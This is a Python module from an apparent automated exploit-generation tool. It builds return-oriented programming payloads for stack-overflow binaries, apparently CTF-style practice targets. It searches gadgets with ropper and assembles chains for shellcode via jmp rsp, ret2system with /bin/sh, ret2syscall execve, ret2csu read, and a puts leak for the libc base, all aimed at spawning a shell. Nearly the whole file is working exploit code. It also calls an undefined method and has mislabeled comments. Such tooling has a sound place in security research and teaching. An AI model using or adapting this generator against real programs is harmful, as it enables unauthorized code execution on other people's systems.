"""
author : 4everdestiny
create_time : 2022.3.2
description : this is the code to generate Return Oriented Programming payload
1. check the protection
2. generate the exploit
input : binary path
output : the exploit needed
"""

import pwn
from exploit_generation.ProtectionInformation import ProtectionInformation
from exploit_generation.PayloadList import PayloadList
from exploit_generation.SinglePayload import SinglePayload
import ropper
import re
from log import log
from pwn import p64
from pwn import u64
from exploit_generation.CsuInitPayload import CsuInitPayload
from exploit_generation.PayloadElement import PayloadElement
log = log.Log()


class ROPGeneration:
    def __init__(self, binarypath, needlength=0, avoidchars="0a", prefixlength=0, needline=False):
        self.binarypath = binarypath
        self.needlength = needlength
        self.avoidchars = avoidchars
        self.prefixlength = prefixlength
        self.needline = needline
        protection = ProtectionInformation(self.binarypath).GetProtection()
        self.canary = protection["Canary"]
        self.NX = protection["NX"]
        self.PIE = protection["PIE"]
        self.static = protection["static"]
        self.arch = protection["arch"]
        self.roppersevice = ropper.RopperService()
        self.LoadRopper()
        pwn.context.arch = protection["arch"]
        pwn.context.bits = protection["bits"]
        pwn.context.endian = protection["endian"]
        self.elf = pwn.ELF(self.binarypath, checksec=False)
        self.libc = pwn.ELF("../binaries/libcs/libc-2.27.so", checksec=False)
        self.payloadlist = PayloadList()
        self.ret2csuinitpayload = CsuInitPayload(self.binarypath)

    def InitRopperOptions(self):
        self.roppersevice.options.all = True
        self.roppersevice.options.badbytes = self.avoidchars
        self.roppersevice.options.color = False
        self.roppersevice.options.inst_count = 10

    def LoadRopper(self):
        self.InitRopperOptions()
        self.roppersevice.addFile(self.binarypath)
        if self.arch == "amd64":
            architecture = "x86_64"
        else:
            architecture = self.arch
        self.roppersevice.setArchitectureFor(name=self.binarypath, arch=architecture)
        self.roppersevice.loadGadgetsFor(name=self.binarypath)
        # self.roppersevice.printGadgetsFor(name=self.binarypath)
        """
        self.popgadgets = self.roppersevice.searchPopPopRet(name=self.binarypath)
        for x in self.popgadgets[self.binarypath]:
            print(x, type(x))
            print(x.simpleInstructionString())
            break
        """

    def GetPayloadList(self):
        """
        return the payload list
        :return: payload list
        """
        return self.payloadlist

    def GeneratePayload(self):
        # protection = ProtectionInformation.ProtectionInformation(self.binarypath).GetProtection()
        if self.static:
            # if it is a static bianry, maybe the canary check will be false
            if not self.NX:
                # no NX, no PIE
                # just generate shellcode and jmp esp first
                self.ROPPayloadStaticNXDisable()
            else:
                # NX enabled, or we cannot find the jmp rsp gadget
                # try to use a ROPchain to solve this problem
                # for static binary, use ret2syscall to solve this problem
                self.ROPPayloadStaticNXEnable()
        else:
            if not self.NX:
                # just generate shellcode and jmp esp first
                self.ROPPayloadDynamicLevel1()
            else:
                # no NX, must use ROP to solve this problem
                self.ROPPayloadDynamicLevel2()
        return self.payloadlist

    def GenerateShellcode(self):
        """
        just generate a shellcode according to the architecture
        :return: a shellcode
        """
        shellcode = pwn.asm(pwn.shellcraft.sh())
        return shellcode

    def FindJmpGadget(self, register="rsp"):
        """
        find jump register gadget, especially for jmp rsp gadget
        :param register: the jmp gadget target register
        :return: None if no gadget found, otherwise the struct of the gadget
        """
        instruction = "jmp {register}".format(register=register)
        result = self.roppersevice.search(search=instruction, name=self.binarypath)
        try:
            file, gadget = next(result)
            return gadget
        except:
            # print("here")
            log.Exception("not found for {instruction}".format(instruction=instruction))
            return None

    def DeepFindPopGadget(self, register="rsp"):
        """
        find pop register gadget,
        when cannot find the pop single register gadget, use this function
        to find pop two registers gadget
        for example: pop rsi, r15, ret (pop ... ret)
        :param register: register, the gadget which want to contain this register
        :return: the gadget struct
        """
        popgadgets = self.roppersevice.searchPopPopRet(name=self.binarypath)
        for file, gadgets in popgadgets.items():
            for gadget in gadgets:
                # print(gadget.affected_regs)
                # never change rsp's value
                if register in gadget.affected_regs and "rsp" not in gadget.affected_regs:
                    return gadget
        return None

    def FindPopGadget(self, register="rsp"):
        """
        find pop register gadget,
        for example: pop rdi; ret
        :param register: the pop gadget target register
        :return: None if no gadget found, otherwise the struct of the gadget
        """
        instruction = "pop {register};ret".format(register=register)
        # if self.arch == "amd64":
        #     architecture = "x86_64"
        # else:
        #     architecture = self.arch
        # asm_instruction = self.roppersevice.asm(instruction, arch=architecture)
        # print(asm_instruction)
        result = self.roppersevice.searchInstructions(code=instruction, name=self.binarypath)
        # result = self.roppersevice.search(search=instruction, name=self.binarypath)
        # print(result)
        try:
            gadget = result[self.binarypath][0]
            # print(dir(gadget))
            # print(gadget.affected_regs)
            # print(gadget, type(gadget))
            return gadget
        except:
            gadget = self.DeepFindPopGadget(register=register)
            if gadget is not None:
                return gadget
            log.Exception("not found for {instruction}".format(instruction=instruction))
            return None

    def FindInstructionGadget(self, instruction="ret"):
        """
        find ret instruction gadget
        :return: None if cannot find, otherwise the struct of gadget
        """
        result = self.roppersevice.searchInstructions(code=instruction, name=self.binarypath)
        try:
            gadget = result[self.binarypath][0]
            return gadget
        except:
            log.Exception("not found for {instruction}".format(instruction=instruction))
            return None

    def GetGadgetAffectedRegisters(self, gadget=None):
        """
        return the list of affect registers
        :param gadget: the gadget struct which you want to get
        :return: the list of affected registers
        """
        if gadget is not None:
            instruction = gadget.simpleInstructionString()
            affected_regs = re.findall("r[a-z0-9]{2}", instruction)
            return affected_regs[:-1]
        else:
            log.Exception("gadget is None, please check the code")
            return None

    def RegisterGadgetGenerate(self, gadget=None, register="rsp", register_value=0):
        """
        accoiding to the register, generate the final payload
        if register is not in the gadget.affected_regs, return empty string
        for example:
        gadget = pop rsi, pop r15, ret
        register = rsi
        payload = p64(gadget) + p64(value) + p64(0) + p64(ret)
        :param gadget: the gadget you find
        :param register: the register which want to change
        :param register_value: the register's value
        :return: the payload according to the value
        """
        if gadget is not None:
            if register not in gadget.affected_regs:
                log.Exception("the register is not in the gadget, check the code")
                return b""
            else:
                payload = b""
                payload += p64(gadget.address)
                # print(dir(gadget))
                # print(gadget)
                affected_regs = self.GetGadgetAffectedRegisters(gadget)
                for i in range(len(affected_regs)):
                    if register == affected_regs[i]:
                        payload += p64(register_value)
                    else:
                        payload += p64(0)
                return payload
        else:
            log.Exception("gadget is None, please check the code")

    def SyscallROPPayloadGenerate(self, rdi=0, rsi=0, rdx=0, syscall_tab=pwn.constants.linux.amd64.SYS_read):
        """
        generate a ROP according to the specific value of the registers
        and the specific syscall such as read/write/execve
        :param rdi: the first parameter of this syscall
        :param rsi: the second parameter of this syscall
        :param rdx: the third parameter of this syscall
        :param syscall_tab: the specific syscall number
        :return: the payload you need
        """
        rdi_gadget = self.FindPopGadget(register="rdi")
        rsi_gadget = self.FindPopGadget(register="rsi")
        rdx_gadget = self.FindPopGadget(register="rdx")
        rax_gadget = self.FindPopGadget(register="rax")
        syscall_gadget = self.FindInstructionGadget(instruction="syscall;ret")
        payload = b""
        payload += self.RegisterGadgetGenerate(
            gadget=rdi_gadget, register="rdi", register_value=rdi)
        payload += self.RegisterGadgetGenerate(
            gadget=rsi_gadget, register="rsi", register_value=rsi)
        payload += self.RegisterGadgetGenerate(
            gadget=rdx_gadget, register="rdx", register_value=rdx)
        payload += self.RegisterGadgetGenerate(
            gadget=rax_gadget, register="rax", register_value=syscall_tab)
        payload += p64(syscall_gadget.address)
        return payload

    def AvoidUbuntuVersionError(self, payload):
        """
        this if statement is used to avoid 18.04 system function's check
        :param payload: the payload need to adjust
        :return: the payload after adjust
        """
        if len(payload) % 0x10 != 0:
            # this if statement is used to avoid 18.04 system function's check
            ret_gadget = self.FindInstructionGadget(instruction="ret")
            ret = ret_gadget.address
            payload = p64(ret) + payload
        return payload

    def ROPPayloadStaticNXDisable(self):
        """
        if this binary has no nx protection, it's in this branch
        1. check whether there is a PIE protection
        2. check whether there is a canary protection
        and set the final payloadlist into self.payloadlist
        :return: True when successfully generated, False when failed
        """
        if self.PIE:
            log.info("PIE enabled, need elf_base first")
        else:
            log.info("PIE disabled, directly use ROP method")
        if self.canary:
            log.info("canary enabled, need canary first")
        else:
            log.info("canary disabled, directly use ROP method")
        jmp_rsp_gadget = self.FindJmpGadget(register="rsp")
        if jmp_rsp_gadget is not None:
            jmp_rsp = jmp_rsp_gadget.address
            payload = []
            if self.canary:
                payload.append(PayloadElement(content=0, type="canary"))
            if self.PIE:
                payload.append(PayloadElement(content=jmp_rsp, type="elf_base"))
            payload.append(PayloadElement(content=self.GenerateShellcode(), type="bytes"))
            if self.canary:
                # prefixlength - 8 for the space given to canary value
                single_payload = SinglePayload(
                    content=payload, length=self.needlength,
                    prefixlength=self.prefixlength - 8
                )
            else:
                single_payload = SinglePayload(
                    content=payload, length=self.needlength,
                    prefixlength=self.prefixlength
                )
            self.payloadlist.AppendPayload(single_payload)
            return True
        else:
            log.info("cannot find jmp rsp gadget in this binary, try other methods")
            return False

    def ROPPayloadStaticNoNXPIECanary(self):
        """
        for no NX, canary, PIE
        :return: True when successful, False when not
        """
        assert not self.NX and not self.canary and not self.PIE
        jmp_rsp_gadget = self.FindJmpGadget(register="rsp")
        if jmp_rsp_gadget is not None:
            jmp_rsp = jmp_rsp_gadget.address
            log.info("find a jump rsp gadget, easy to exploit")
            payload = p64(jmp_rsp)
            payload += self.GenerateShellcode()
            single_payload = SinglePayload(
                content=payload, length=self.needlength,
                prefixlength=self.prefixlength
            )
            self.payloadlist.AppendPayload(single_payload)
            return True
        else:
            log.info("cannot find jmp rsp gadget in this binary, try other methods")
            return False

    def ROPPayloadStaticNXEnable(self):
        """
        for NX enable, use ROP chain to solve this payload
        :return: the ROP payload
        """
        if "system" in self.elf.symbols.keys():
            log.info("find a system symbol in this binary, just use this")
            havesystem = True
            system = self.elf.symbols["system"]
        else:
            log.info("no system in this binary, try to use ret2syscall")
            havesystem = False
            system = 0
        try:
            log.info("find /bin/sh string in this binary")
            binsh = next(self.elf.search(b"/bin/sh"))
            havebinsh = True
        except:
            log.info("cannot find /bin/sh string in this binary")
            binsh = 0
            havebinsh = False
        # final_payload = b""
        if havesystem and havebinsh:
            log.info("have system and binsh, find the rdi and ROP it")
            rdi_gadget = self.FindPopGadget(register="rdi")
            final_payload = b""
            final_payload += self.RegisterGadgetGenerate(
                gadget=rdi_gadget, register="rdi", register_value=binsh)
            final_payload += p64(system)
            final_payload = self.AvoidUbuntuVersionError(final_payload)
            self.payloadlist.AppendPayload(SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength
            ))
        if not havesystem and havebinsh:
            log.info("have binsh but no system")
            log.info("for static binary, use the ret2syscall method to solve this")
            final_payload = b""
            final_payload += self.SyscallROPPayloadGenerate(
                rdi=binsh, rsi=0, rdx=0, syscall_tab=pwn.constants.linux.amd64.SYS_execve)
            final_payload = self.AvoidUbuntuVersionError(final_payload)
            self.payloadlist.AppendPayload(SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength
            ))
        if not havebinsh:
            # if no binsh in this binary, try to use read syscall to create a binsh
            log.info("have system but no binsh")
            log.info("for static binary, use the ret2syscall method to solve this")
            # finish the read syscall payload
            binsh_addr = self.elf.bss()
            binsh_string = b"/bin/sh\x00"
            final_payload = b""
            final_payload += self.SyscallROPPayloadGenerate(
                rdi=0, rsi=binsh_addr, rdx=len(binsh_string), syscall_tab=pwn.constants.linux.amd64.SYS_read
            )
            final_payload = self.AvoidUbuntuVersionError(final_payload)
            # finish the execve syscall
            final_payload += self.SyscallROPPayloadGenerate(
                rdi=binsh_addr, rsi=0, rdx=0, syscall_tab=pwn.constants.linux.amd64.SYS_execve
            )
            self.payloadlist.AppendPayload(SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength
            ))
            self.payloadlist.AppendPayload(SinglePayload(
                content=binsh_string, length=len(binsh_string),
                prefixlength=0
            ))
        return False

    def ROPPayloadDynamicLevel1(self):
        """
        no NX enabled, jmp esp and to shellcode
        :return: None
        """
        canfind_jmpesp = self.ROPPayloadStaticLevel1()
        if canfind_jmpesp:
            log.info("generate successfully")
            return True
        else:
            log.info("no jump rsp gadget, try to use ROP method")
        final_payload = b""
        if "read" in self.elf.symbols:
            shellcode_address = self.elf.bss()
            shellcode = self.GenerateShellcode()
            final_payload += self.ret2csuinitpayload.GetCsuPayload(
                rdi=0, rsi=shellcode_address, rdx=len(shellcode),
                call_address=self.elf.got["read"], fullpayload=True
            )
            final_payload += p64(shellcode_address)
            self.payloadlist.AppendPayload(SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength
            ))
            # print(hex(len(final_payload)))
            self.payloadlist.AppendPayload(SinglePayload(
                content=shellcode, length=len(shellcode),
                prefixlength=0
            ))
        return True

    def ROPPayloadDynamicLevel2(self):
        """
        NX enabled, use ROP to solve the problem
        :return: True when successfully generated, False when not
        """
        if "system" in self.elf.symbols.keys():
            log.info("find a system symbol in this binary, just use this")
            havesystem = True
            system = self.elf.symbols["system"]
        else:
            log.info("no system in this binary, try to use ret2syscall")
            havesystem = False
            system = 0
        try:
            log.info("find /bin/sh string in this binary")
            binsh = next(self.elf.search(b"/bin/sh"))
            havebinsh = True
        except:
            log.info("cannot find /bin/sh string in this binary")
            binsh = 0
            havebinsh = False
        if havesystem and havebinsh:
            log.info("have system and binsh, find the rdi and ROP it")
            rdi_gadget = self.FindPopGadget(register="rdi")
            final_payload = b""
            final_payload += self.RegisterGadgetGenerate(
                gadget=rdi_gadget, register="rdi", register_value=binsh)
            final_payload += p64(system)
            final_payload = self.AvoidUbuntuVersionError(final_payload)
            self.payloadlist.AppendPayload(SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength
            ))
            return True
        if havesystem and not havebinsh:
            log.info("have system but no binsh, find the rdi and ROP it")
            bss_addr = self.elf.bss()
            binsh_string = b"/bin/sh"
            rdi_gadget = self.FindPopGadget(register="rdi")
            final_payload = b""
            final_payload += self.ret2csuinitpayload.GetCsuPayload(
                rdi=0, rsi=bss_addr, rdx=len(binsh_string),
                call_address=self.elf.got["read"], fullpayload=True
            )
            final_payload += self.RegisterGadgetGenerate(
                gadget=rdi_gadget, register="rdi", register_value=bss_addr)
            final_payload += p64(system)
            final_payload = self.AvoidUbuntuVersionError(final_payload)
            self.payloadlist.AppendPayload(SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength
            ))
            self.payloadlist.AppendPayload(SinglePayload(
                content=binsh_string, length=len(binsh_string),
                prefixlength=0
            ))
            return True
        if not havesystem:
            log.info("no system, must use leak info to leak libc base and ROP")
            rbp_gadget = self.FindPopGadget(register="rbp")
            rdi_gadget = self.FindPopGadget(register="rdi")
            bss_address = self.elf.bss()
            print(hex(rbp_gadget.address))
            final_payload = b""
            final_payload += self.RegisterGadgetGenerate(
            gadget=rdi_gadget, register="rdi", register_value=self.elf.got["puts"])
            final_payload += p64(self.elf.plt["puts"])
            final_payload += self.ret2csuinitpayload.GetCsuPayload(
                rdi=0, rsi=bss_address, rdx=0x10,
                call_address=self.elf.got["read"], fullpayload=False
            )
            final_payload += self.ret2csuinitpayload.GetCsuPayload(
                rdi=bss_address+8, rsi=0, rdx=0,
                call_address=bss_address, fullpayload=True
            )
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength
            )
            singlepayload.AddRecvInfo(
                type="libc_base", recv_index=[0, 6], func="u64",
                adjustoffset=-self.libc.symbols["puts"]
            )
            self.payloadlist.AppendPayload(singlepayload)
            final_payload2 = []
            final_payload2.append(self.libc.symbols["system"])
            final_payload2.append(u64("/bin/sh\x00"))
            singlepayload = SinglePayload(
                content=final_payload2, length=0x10,
                needadjust=True,
                prefixlength=0
            )
            singlepayload.AddAdjustList(type="libc_base", indexs=[0])
            self.payloadlist.AppendPayload(singlepayload)
        return False


if __name__ == '__main__':
    """
    binarypath = "../binaries/stack_overflow/level1/test1/level1_test1"
    ROPGeneration = ROPGeneration(binarypath)
    payload = ROPGeneration.GeneratePayload()
    print(payload)
    """
    binarypath = "../binaries/stack_overflow/dynamic/test4/dynamic_test4"
    ROPGeneration = ROPGeneration(binarypath, needlength=0x100)
    payload = ROPGeneration.GeneratePayload()
    print(payload)